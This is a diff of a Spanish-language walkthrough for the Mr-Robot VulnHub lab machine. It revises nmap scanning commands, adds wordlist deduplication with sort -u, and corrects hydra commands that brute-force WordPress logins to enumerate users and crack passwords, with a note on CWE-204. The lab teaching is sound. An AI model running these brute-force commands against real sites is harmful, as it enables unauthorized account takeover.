@@ -13,16 +13,15 @@ Descarga [aquí](https://www.vulnhub.com/entry/mr-robot-1,151/)
 Como suele ser habitual, comenzamos con un escaneo de puertos para comprobar que servicios y versiones hay disponibles en esta máquina. En este caso nos encontramos con un servidor apache en el puerto 80 y 443. Si profundizamos un poco más 
 
 ```console
-root@ine# nmap -sS -p- -T4 -sC -sV target.ine.local
-root@ine# nmap -p80,443 --script http-enum target.ine.local
+root@ine# nmap -sS -p- -T4 -sC -sV 192.168.1.142
 ```
 
 ![nmap](img/nmap.png)
 
-Si profundizamos un poco más en la enumwp-eración, podemos encontrar algunos directorios típicos que nos confirman que nos enfrentamos a una web creada con wordpress.
+Si profundizamos un poco más en la enumeración, podemos encontrar algunos directorios típicos que nos confirman que nos enfrentamos a una web creada con wordpress.
 
 ```console
-root@ine# nmap -p80,443 --script http-enum target.ine.local
+root@ine# nmap -p80,443 --script http-enum 192.168.1.142
 ```
 
 ![nmap2](img/nmap2.png)
@@ -43,20 +42,21 @@ Para enumerar los usuarios necesitamos los valores de los campos del formulario.
 
 ![burp](img/burp.png)
 
-Una vez que conocemos estos parámetros, usamos hydra y la lista obtenida durante la fase de reconocimiento inicial.
+Una vez que conocemos estos parámetros, usamos hydra y la lista obtenida durante la fase de reconocimiento inicial. Hay que tener en cuenta que el diccionario es considerablemente largo y contiene palabras duplicadas, es recomendable eliminarlas.
 
 ```console
-kali@kali$ hydra -L fsocity.dic -p test 192.168.1.142 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
+kali@kali$ sort -u fsocity.dic > fs-list
+kali@kali$ hydra -L fs-list -p test 192.168.1.142 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
 ```
 
 ![hydra1](img/hydra1.png)
 
-Si ahora intentamos iniciar sesión con el usuario `Elliot`, vemos que el mensaje cambia.
+Si ahora intentamos iniciar sesión con el usuario `Elliot`, vemos que el mensaje cambia. Esto se debe a que WordPress, en versiones antiguas, cometía el error de diseño de revelar si el usuario existía cambiando el mensaje de error, lo que permitía la enumeración de usuarios ([**CWE-204**](https://cwe.mitre.org/data/definitions/204.html))
 
 ![login2](img/login2.png)
 
 ```console
-kali@kali$ hydra -l Elliot -p fsocity.dic 192.168.1.142 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for de username"
+kali@kali$ hydra -l Elliot -P fs-list 192.168.1.142 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for de username"
 ```
 
 ![hydra2](img/hydra2.png)
